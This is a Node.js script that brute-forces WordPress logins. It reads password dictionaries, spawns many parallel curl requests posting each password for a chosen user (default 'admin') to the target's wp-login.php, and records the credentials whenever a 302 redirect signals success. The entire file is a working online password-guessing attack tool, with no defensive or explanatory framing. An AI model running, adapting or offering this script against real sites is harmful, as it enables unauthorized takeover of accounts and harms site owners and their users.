#!/usr/bin/env node
// node ./ -d ./~dicts/ -h 'http://www.example.com' -r
// 

var fs = require('fs')
,split = require('split')
,path = require('path')
,through = require('through')
,cp = require('child_process').spawn
,argv = require('minimist')(process.argv.slice(2))
,config = require('./config')
,matchKey = 'Match!'
,verbose = !!argv.v
,host = argv.h || ''
,loginPath = argv.p || '/wp-login.php'
,user = encodeURIComponent(argv.u || 'admin')
,dictFile = argv.d || __dirname+'/dict.example'
,dictDir
,checked = {}
,statsInterval = null
,stats = {
	attempts: 0
	,attemptsCompleted: 0
	,filesOpened: 0
	,filesRead: 0
	,dups: 0
	,timeStart: null
	,timeEnd: null
	,matches: []
}
;

console.log(['host: '+host, 'loginPath: '+loginPath, 'user: '+user, 'dictFile: '+dictFile, 'config: '+JSON.stringify(config)/*, 'cmd: '+cmd*/].join('\n'),'\n');

handleProcessErrors();
if (verbose)
	startStatsInterval();

stats.timeStart = new Date;
fs.stat(dictFile,function(err,stat){
	if (err)
		return console.log('Error reading dict', err);
	var files;
	if (stat.isDirectory()){
		dictDir = path.normalize(dictFile);
		try {
			files = fs.readdirSync(dictFile);
			files.forEach(function(file,i){
				files[i] = dictDir+'/'+file;
			});
		} catch (e) {
			return console.log('Error reading dir', e);
		}
	} else if (stat.isFile()) {
		dictDir = path.dirname(dictFile);
		files = [dictFile];
	} else {
		return console.log('Dict path is not a file or directory');
	}
	through(checkDicts).on('attemptReceived',function(err,data){
		//console.log('attemptReceived',err,data);
		if (err)
			console.log('Attempt Error', err);
	}).on('fileRead',function(err,data){
		if (err)
			console.log('File Read Error', err);
	}).on('end',showResults).write(files);
});

function showResults(err){
	stopStatsInterval();
	if (err)
		console.log('\n------------ Error! ------------\n',err);
	else
		console.log('\n------------ El Fin ------------\n');
	stats.timeEnd = new Date;
	stats.timeStart = stats.timeStart.toString();
	stats.timeEnd = stats.timeEnd.toString();
	console.log(stats,'\n');
	if (err)
		throw err;
}

function handleProcessErrors(){
	process.on('SIGINT',showResults);
	process.on('uncaughtException',showResults);
}

function startStatsInterval(){
	statsInterval = setInterval(function(){
		console.log('\n----------------------------\n');
		console.log(stats);
		console.log('\n----------------------------\n');
	},10000);
}

function stopStatsInterval(){
	if (statsInterval !== null) {
		clearInterval(statsInterval);
		statsInterval = null;
	}
}

function checkDicts(files){
	var z = this
	,filesFinished = 0
	,attempts = 0
	,attemptsReceived = 0
	,activeCmds = 0
	,cmdQueue = []
	,matches = []
	;
	files.forEach(function(file){
		++stats.filesOpened;
		fs.createReadStream(file).pipe(split()).on('data',function(pass){
			//console.log(pass);
			if (checked[pass]) {
				++stats.dups;
				return z.emit('attemptReceived');
			}
			checked[pass] = true;
			++stats.attempts;
			++attempts;
			queueCmd(pass);
		}).on('error',fileFinished).on('close',fileFinished);
		function fileFinished(err){
			++filesFinished;
			if (!err)
				++stats.filesRead;
			z.emit('fileRead',err,file);
		}
		function queueCmd(pass){
			if (activeCmds < config.maxCmdThreads)
				return runCmd(pass);
			cmdQueue.push({pass:pass});
		}
		function runCmd(pass){
			++activeCmds;
			checkAuth(user, pass, function(err,match){
				++attemptsReceived;
				if (!err) {
					++stats.attemptsCompleted;
					if (match) {
						matches.push(match);
						stats.matches.push(match);
					}
				}
				z.emit('attemptReceived',err,match);
				if (attemptsReceived == attempts)
					return z.emit('done',false,matches);
				--activeCmds;
				if (cmdQueue.length) {
					var cmd = cmdQueue.shift();
					runCmd(cmd.pass);
				}
			});
		}
	});
}

function checkAuth(user,pass,cb){
	// config.curl+" -v '"+host+loginPath+"' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' -H 'Origin: "+host+"' -H 'Accept-Encoding: gzip,deflate,sdch' -H 'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: "+host+loginPath+"' -H 'Connection: keep-alive' --data 'log="+user+"&pwd=%PASS%&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1' --compressed 2>&1" //  2>&1 /dev/null
	//if (verbose) console.log('Check: '+user+'/'+pass);
	var cmd = 'curl'//config.curl
	,args = ['-v',host+loginPath
	,'-H',"Cookie: wordpress_test_cookie=WP+Cookie+check"
	,'-H',"Origin: "+host
	,'-H',"Accept-Encoding: gzip,deflate,sdch'"
	,'-H',"Accept-Language: en-US,en;q=0.8"
	,'-H',"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
	,'-H',"Content-Type: application/x-www-form-urlencoded"
	,'-H',"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	,'-H',"Cache-Control: max-age=0"
	,'-H',"Referer: "+host+loginPath
	,'-H',"Connection: keep-alive"
	,'--data',"log="+user+"&pwd="+encodeURIComponent(pass)+"&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1"
	,'--compressed'
	];
	// can make faster by killing the process after stdErr is done
	spawn(cmd,args,function(err,stdOut,stdErr){
		var match = null;
		//console.log('stdErr', stdErr);
		if (!err && stdErr.indexOf('302 Found') != -1) {
			match = {
				user: user
				,pass: pass
			};
			if (verbose) console.log(matchKey,'  ',match);
		}
		cb(err,match);
	});
}


function spawn(cmd,args,cb){
	var exitCode ,errs = [] ,outs = [] ,c = 3
	,proc = cp(cmd,args).on('exit',function(code){
		exitCode = code;
		done();
	});
	proc.stderr.on('data',function(data){
		errs.push(data);
	}).on('end',done);
	proc.stdout.on('data',function(data){
		outs.push(data);
	}).on('end',done);
	function done(){
		if (--c)
			return;
		var err = errs.length ? Buffer.concat(errs).toString() : false
		,out = outs.length ? Buffer.concat(outs).toString() : ''
		;
		if (cb)
			cb(exitCode||false,out,err);
	}
}
